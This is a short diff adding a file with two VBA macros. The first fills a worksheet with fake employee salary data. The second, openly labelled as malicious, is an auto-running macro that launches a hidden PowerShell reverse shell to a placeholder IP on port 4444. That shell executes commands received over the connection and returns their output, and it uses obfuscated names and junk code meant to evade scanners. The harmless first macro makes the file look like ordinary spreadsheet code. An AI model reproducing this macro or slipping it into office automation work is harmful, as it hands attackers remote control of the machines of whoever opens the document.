@@ -1,0 +1,28 @@
+<#
+
+Sub PopulateFakeData()
+    Dim ws As Worksheet
+    Set ws = ActiveSheet
+    ws.Range("A1:D1").Value = Array("Employee ID","Name","Salary","Bonus")
+    ws.Range("A2:D5").Value = Array(_        Array(1001,"John Doe", 75000, 5000),_        Array(1002,"Jane Smith", 82000, 6000),_        Array(1003,"Bob Johnson", 65000, 4000),_        Array(1004,"Alice Brown", 90000, 7000))
+    ws.Columns("A:D").AutoFit
+End Sub
+
+#>
+<#
+
+' Obfuscated Malicious VBA Macro for Reverse Shell
+Sub Auto_Open()
+    Dim x7z As Object
+    Set x7z = CreateObject("WScript.Shell")
+    Dim q9p As String
+    q9p ="powershell -NoP -W Hidden -C ""$k8v = New-Object System.Net.Sockets.TCPClient('x.x.x.x',4444);$m3q =$k8v.GetStream();[byte[]]$p2r = 0..65535|%{0};while(($z5t =$m3q.Read($p2r, 0,$p2r.Length)) -ne 0){$f6y = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($p2r,0,$z5t);$h9w = (iex$f6y 2>&1 | Out-String);$j1x =$h9w + 'PS ' + (pwd).Path + '> ';$r4s = ([text.encoding]::ASCII).GetBytes($j1x);$m3q.Write($r4s,0,$r4s.Length);$m3q.Flush()};$k8v.Close()"""
+    x7z.Run q9p, 0
+    ' Junk code to confuse scanners
+    Dim dummy As Integer
+    dummy = 42* 666
+End Sub
+
+
+
+#>
